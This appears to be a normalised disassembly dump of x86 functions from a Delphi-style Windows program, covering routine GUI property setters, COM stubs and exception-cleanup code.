mov eax [ eax + 0x230 ]
retn
cmp edx [ eax + 0x21c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_475848
mov ecx [ eax + 0x250 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x234 ]
retn
cmp edx [ eax + 0x24c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_475868
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
lea edx [ ebx + 0x210 ]
lea eax [ ebx + 0x228 ]
call sub_470320
pop esi
pop ebx
retn
sub_475884
mov ecx [ eax + 0x224 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
mov al 0x1
retn
sub_475898
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4727b4
mov eax [ esp + 0x10 ]
sub eax [ ebx + 0x258 ]
inc eax
add esp 0x60
pop ebx
retn
sub_4758b8
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4727b4
mov eax [ esp + 0x40 ]
sub eax [ ebx + 0x25c ]
inc eax
add esp 0x60
pop ebx
retn
sub_4758d8
cmp dl [ eax + 0x218 ]
je r-xdata
retn
mov [ eax + 0x218 ] dl
call sub_44dd40
sub_4759e6
jmp sub_4039a8
sub_4759ed
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475a6c
cmp edx [ eax + 0x240 ]
je r-xdata
retn
mov [ eax + 0x240 ] edx
call sub_473750
sub_475b08
jmp sub_4039a8
sub_475b0f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475ba0
jmp sub_4039a8
sub_475ba7
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475bd8
cmp edx [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] edx
call sub_473750
sub_475c64
cmp edx [ eax + 0x22c ]
je r-xdata
retn
push 0x1
mov ecx edx
mov edx [ eax + 0x228 ]
call sub_473478
sub_475d56
jmp sub_4039a8
sub_475d5d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475d64
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_44dd40
sub_475dd7
jmp sub_4039a8
sub_475f9a
jmp sub_4039a8
sub_475fa1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_476004
mov [ edx + 0xc ] 0x1
test [ eax + 0x249 ] 0x10
jne r-xdata
retn
test [ eax + 0x249 ] 0x8
je r-xdata
test [ eax + 0x249 ] 0x4
je r-xdata
or [ edx + 0xc ] 0x2
or [ edx + 0xc ] 0x80
sub_476080
push ebx
mov ebx eax
mov eax ebx
call sub_44b63c
cmp [ ebx + 0x27c ] 0x0
je r-xdata
pop ebx
retn
call GetMessageTime
mov edx [ ebx + 0x27c ]
mov [ edx + 0x244 ] eax
sub_476210
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
mov edx 0x1
call sub_473b7c
retn
sub_476228
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
xor edx edx
call sub_473b7c
retn
sub_4762c5
jmp sub_4039a8
sub_4762cc
mov esp ebp
pop ebp
retn
sub_4762d0
push ebx
mov ebx eax
mov eax ebx
call sub_44ba60
mov eax ebx
call sub_47623c
pop ebx
retn
sub_476334
push ebx
mov ebx eax
mov eax ebx
call sub_44fdb8
mov eax ebx
call sub_44dd40
pop ebx
retn
sub_4765ac
push ebx
mov ebx eax
mov eax ebx
call sub_474760
mov eax ebx
call sub_475e54
pop ebx
retn
sub_4765c0
push ebx
mov ebx eax
mov ecx [ ebx + 0x21c ]
dec ecx
mov eax ebx
call sub_471974
mov edx [ ebx + 0x21c ]
dec edx
mov eax ebx
call sub_4758ec
pop ebx
retn
sub_4765e4
push ebx
mov ebx eax
mov ecx [ ebx + 0x24c ]
dec ecx
mov eax ebx
call sub_471a4c
mov edx [ ebx + 0x24c ]
dec edx
mov eax ebx
call sub_475c7c
pop ebx
retn
sub_4766d8
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_4766e4
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_4766f0
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_4766fc
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_476708
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_476714
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_476720
push ebx
mov ebx eax
mov eax ebx
call sub_44fc64
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_474760
sub_47673c
push ebx
cmp [ eax + 0x29a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
sub_4767dc
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_4768f8
push ebx
mov ebx eax
mov eax ebx
call sub_471b34
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_476968
mov edx [ r-xdata ]
call sub_404d8c
retn
sub_476f34
retn
sub_476f93
jmp sub_4039a8
sub_476f9a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477038
jmp sub_4039a8
sub_47703f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477104
jmp sub_4039a8
sub_47710b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477203
jmp sub_4039a8
sub_47720a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477214
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
xor eax eax
pop ebp
retn
sub_477288
push ebx
push eax
push sub_477198
push eax
push sub_47724c
mov cl 0x1
mov eax edx
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
retn
sub_4772e8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
retn
sub_4773b8
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4773fc
mov eax [ eax + 0x10 ]
call sub_476ef0
retn
sub_477434
mov eax edx
call sub_476968
xor eax eax
retn
sub_477440
push ebx
mov ebx eax
mov edx sub_477434
mov eax [ ebx + 0x10 ]
call sub_476f2c
mov eax [ ebx + 0x10 ]
call sub_476e84
mov eax ebx
call sub_4773b8
pop ebx
retn
sub_47756d
jmp sub_4039a8
sub_477594
jmp sub_4039a8
sub_47759b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47766e
jmp sub_4039a8
sub_477675
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47776a
jmp sub_4039a8
sub_477771
pop ecx
pop ebp
retn
sub_47784b
jmp sub_4039a8
sub_477852
pop ebx
pop ecx
pop ebp
retn
sub_4778b8
mov eax [ eax + 0x10 ]
call sub_477c5c
retn
sub_477aec
jmp sub_4039a8
sub_477b1b
jmp sub_4039a8
sub_477b22
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_477bb8
jmp sub_4039a8
sub_477bbf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_477bc8
inc [ eax + 0x2e8 ]
retn
sub_477bd0
dec [ eax + 0x2e8 ]
retn
sub_477c5c
push ebx
mov ebx eax
mov [ ebx + 0x2e4 ] dl
test dl dl
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
mov eax ebx
call sub_473750
mov [ ebx + 0x2e5 ] 0x0
sub_477ebd
jmp sub_4039a8
sub_477ec4
pop ebp
retn
sub_477ec8
sub [ rw-data ] 0x1
retn
sub_478364
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_478378
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_47838c
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_4783a0
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_47846e
jmp sub_4039a8
sub_47847c
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_478490
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4784a4
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_4784b8
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_4784d4
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_478544
push ebx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_478560
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_47859c
inc [ eax + 0x3c ]
retn
sub_4788c0
jmp sub_4039a8
sub_4788c7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47893c
jmp sub_4039a8
sub_478943
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4789b3
jmp sub_4039a8
sub_4789ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478a27
jmp sub_4039a8
sub_478a2e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478ae3
jmp sub_4039a8
sub_478aea
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478b79
jmp sub_4039a8
sub_478b80
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_478bf3
jmp sub_4039a8
sub_478bfa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478c6c
jmp sub_4039a8
sub_478c73
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478ce8
jmp sub_4039a8
sub_478cef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478d5f
jmp sub_4039a8
sub_478d66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478dd3
jmp sub_4039a8
sub_478dda
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478e4c
jmp sub_4039a8
sub_478e53
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478ecc
jmp sub_4039a8
sub_478ed3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_478f50
jmp sub_4039a8
sub_478f57
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_478fb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_42b618
pop esi
pop ebx
retn
sub_478fc4
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_479033
jmp sub_4039a8
sub_47903a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4790a7
jmp sub_4039a8
sub_4790ae
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4790d9
jmp sub_4039a8
sub_4790e0
pop ebp
retn
sub_4790e4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4785a0
mov [ rw-data ] eax
sub_479165
jmp sub_4039a8
sub_47916c
pop ebp
retn
sub_479170
sub [ rw-data ] 0x1
retn
sub_4793db
jmp sub_4039a8
sub_479476
jmp sub_4039a8
sub_47949c
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_479334
call sub_4039e0
pop ebx
retn
sub_4796a4
jmp sub_4039a8
sub_4796ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479750
jmp sub_4039a8
sub_479757
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_479802
jmp sub_4039a8
sub_479809
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_479a14
jmp sub_4039a8
sub_479a1b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479d34
jmp sub_4039a8
sub_479d3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479d5e
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404a0c
retn
sub_479d57
jmp sub_4039a8
sub_479d5e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_479e7c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
retn
sub_479ff5
jmp sub_4039a8
sub_479ffc
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47a004
push 0x0
xor ecx ecx
call sub_479f30
retn
sub_47a010
xor ecx ecx
mov edx 0x20
call sub_402c68
retn
sub_47a2ce
jmp sub_4039a8
sub_47a2d5
pop ebp
retn
sub_47a37d
jmp sub_4039a8
sub_47a384
pop ebp
retn
sub_47a388
sub [ rw-data ] 0x1
retn
sub_47a443
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47a7c0
sub_47a44d
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47a7d4
sub_47a461
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47a70c
sub_47a46b
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47a770
sub_47a475
add [ esp + 0x4 ] 0xfffffff4
jmp sub_47a790
sub_47a6e0
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403578
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_47a760
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub_47a7b0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_47a7c0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_47a7d4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_47a95f
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405328
retn
sub_47a96e
jmp sub_4039a8
j_sub_47a95f
jmp sub_47a95f
sub_47a975
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_47a980
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_47aa58
retn
sub_47aba6
jmp sub_4039a8
sub_47abad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47abb4
lea ecx [ eax + 0x3c ]
push ecx
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x30 ]
add eax 0x20
xchg edx eax
call sub_4796c4
retn
sub ecx 0xfffffff4
sub_47abd0
lea ecx [ eax + 0x3c ]
mov eax [ eax + 0x30 ]
add eax 0x20
xchg edx eax
call sub_479770
retn
sub_47abe0
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov al [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_47abf4
mov [ eax + 0x48 ] dl
retn
sub_47abf8
push ebx
mov ebx eax
mov eax ebx
call sub_47abe0
cmp al 0x4
jne r-xdata
mov al [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_47ac10
mov [ eax + 0x40 ] dl
retn
sub_47ac3c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_47ac4c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_47ac81
jmp sub_4039a8
sub_47ac88
pop ebp
retn
sub_47ac8c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
sub_47accd
jmp sub_4039a8
sub_47acd4
pop ebp
retn
sub_47acd8
sub [ rw-data ] 0x1
retn
sub_47ad05
jmp sub_4039a8
sub_47ad0c
pop ebp
retn
sub_47ad10
sub [ rw-data ] 0x1
retn
sub_47ad6d
jmp sub_4039a8
sub_47ad74
pop ebp
retn
sub_47ad78
sub [ rw-data ] 0x1
retn
sub_47add9
jmp sub_4039a8
sub_47ade0
pop ebp
retn
sub_47ade4
sub [ rw-data ] 0x1
retn
sub_47ae77
add [ esp + 0x4 ] 0xfffffff0
jmp sub_47b608
sub_47ae81
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405ab4
sub_47ae8b
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405adc
sub_47ae95
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405af0
sub_47af41
add eax 0xffffffe0
jmp sub_47bb1c
sub_47af49
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405ab4
sub_47af53
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405adc
sub_47af5d
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405af0
sub_47af67
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_47af73
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405ab4
sub_47af87
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405af0
sub_47b069
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405ab4
sub_47b07d
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405af0
sub_47b087
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_47b093
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405ab4
sub_47b09d
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405adc
sub_47b0a7
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405af0
sub_47b37f
jmp sub_4039a8
sub_47b386
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b3e6
jmp sub_4039a8
sub_47b3ed
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b437
jmp sub_4039a8
sub_47b43e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b4c4
cmp [ eax + 0x18 ] 0x0
jne r-xdata
retn
call sub_47b554
sub_47b538
jmp sub_4039a8
sub_47b53f
pop ebx
pop ecx
pop ebp
retn
sub_47b554
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
mov edx r-xdata
mov eax [ ebx + 0xc ]
call sub_479770
lea eax [ ebx + 0xc ]
call sub_405a08
pop ebx
retn
sub_47b5eb
jmp sub_4036f4
sub_47b5f0
call sub_47b270
mov ebx eax
call sub_403a5c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_47b608
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47b7c7
jmp sub_4039a8
sub_47b7f4
jmp sub_4039a8
sub_47b7fb
pop ebx
mov esp ebp
pop ebp
retn
sub_47b969
jmp sub_4039a8
sub_47b996
jmp sub_4039a8
sub_47bae9
jmp sub_4039a8
sub_47baf0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47bb6b
jmp sub_4039a8
sub_47bb72
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47bb77
add [ edx ] al
loopne r-xdata
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
sub_47bc32
jmp sub_4039a8
sub_47bc39
pop ecx
pop ecx
pop ebp
retn
sub_47bcf5
jmp sub_4039a8
sub_47bdd9
jmp sub_4039a8
sub_47be05
jmp sub_4039a8
sub_47becc
retn
sub_47bfce
jmp sub_4039a8
sub_47c120
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
pop ebx
retn
sub_47c176
jmp sub_4039a8
sub_47c17d
pop ecx
pop ebp
retn
sub_47c1de
jmp sub_4039a8
sub_47c1e5
pop ecx
pop ebp
retn
sub_47c1e8
retn
sub_47c2a3
jmp sub_4039a8
sub_47c2aa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c2ff
jmp sub_4039a8
sub_47c306
pop ebx
pop ecx
pop ebp
retn 0x4
sub_47c34b
jmp sub_4039a8
sub_47c352
pop ebx
pop ecx
pop ebp
retn 0x4
sub_47c448
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
retn
push ecx
push edx
push eax
call [ rw-data ]
retn
sub_47c4eb
jmp sub_4039a8
sub_47c4f2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_47c551
jmp sub_4039a8
sub_47c558
pop ebp
retn
sub_47c55c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_426ad0
call sub_47c358
sub_47c581
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47cf70
sub_47c58b
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47cf80
sub_47c595
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47cf94
sub_47c59f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47cfa0
sub_47c5a9
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47cee0
sub_47c5bd
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47cf5c
sub_47c67d
add [ esp + 0x4 ] 0xfffffdb4
jmp sub_47f944
sub_47c68a
add [ esp + 0x4 ] 0xfffffdb4
jmp sub_47f950
sub_47c697
add [ esp + 0x4 ] 0xfffffdb4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_47c720
add [ eax ] al
add [ esp + 0x4 ] 0xfffffdac
jmp sub_47f55c
sub_47c72f
add [ esp + 0x4 ] 0xfffffdac
jmp sub_47f570
sub_47c73c
add [ esp + 0x4 ] 0xfffffdac
jmp sub_47f57c
sub_47c749
add [ esp + 0x4 ] 0xfffffdac
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_47ce12
jmp sub_4039a8
sub_47ce19
pop ebx
pop ecx
pop ebp
retn
sub_47ce7d
jmp sub_4039a8
sub_47ce84
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47cebc
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403578
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_47cf5c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_47f024
pop ebp
retn 0x4
sub_47cf70
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_47cf80
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_47cf94
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_47d381
jmp sub_4036f4
sub_47d57f
jmp sub_4036f4
sub_47d5b4
jmp sub_4039a8
sub_47d5bb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d776
jmp sub_4039a8
sub_47d77d
mov esp ebp
pop ebp
retn
sub_47d839
jmp sub_4036f4
sub_47d866
jmp sub_4039a8
sub_47d86d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47d999
jmp sub_4036f4
sub_47d99e
call sub_403a5c
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_403820#2
jmp sub_403820
sub_47db1c
push ebx
mov ebx eax
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x214 ] eax
sub_47dc4c
add esp 0xfffffff0
mov ecx esp
call sub_47dc80
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_47dd02
jmp sub_4039a8
sub_47dd09
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47dd5e
jmp sub_4039a8
sub_47dd65
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036f4#2
jmp sub_4036f4
sub_47e0b1
jmp sub_4036f4
sub_47e0b6
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e0d4
retn
sub_47e225
jmp sub_4039a8
sub_47e22c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036f4
jmp sub_4036f4
sub_47e23b
mov eax [ ebp - 0x4 ]
call sub_47db1c
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47e2f8
call sub_47e318
retn
sub_47e300
add esp 0xfffffff0
mov [ esp ] 0x9
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_47e5e8
add esp 0x10
retn
sub_47e318
add esp 0xfffffff0
mov [ esp ] 0x3
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_47e5e8
add esp 0x10
retn
sub_47e3d6
jmp sub_4039a8
sub_47e3dd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47e3e4
add esp 0xfffffff0
mov [ esp ] 0xb
test cx cx
je r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x8 ] 0xffff
jmp r-xdata
mov ecx esp
call sub_47e5e8
add esp 0x10
retn
sub_47e410
call sub_47e5e8
retn
sub_47e47d
jmp sub_4036f4
sub_47e4e8
jmp sub_4039a8
sub_47e4ef
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47e5bd
jmp sub_4039a8
sub_47e5da
jmp sub_4039a8
sub_47e5e1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e68f
jmp sub_4039a8
sub_47e696
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e6f0
jmp sub_4039a8
sub_47e6f7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e79e
jmp sub_4039a8
sub_47e7a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e987
jmp sub_4036f4
sub_47e98c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47eb2c
jmp sub_4039a8
sub_47eb33
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47eb56
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_47db1c
sub_47eb4f
jmp sub_4039a8
j_sub_403820#3
jmp sub_403820
sub_47ecfd
jmp sub_4039a8
sub_47ed87
jmp sub_4039a8
sub_47ee6c
jmp sub_4039a8
sub_47ee89
jmp sub_4039a8
sub_47ee90
mov esp ebp
pop ebp
retn
sub_47f00c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_47f024
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_47f03c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_47f048
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_47f060
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_47f078
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_47dd84
xor eax eax
pop ebp
retn 0x4
sub_47f08c
push ebp
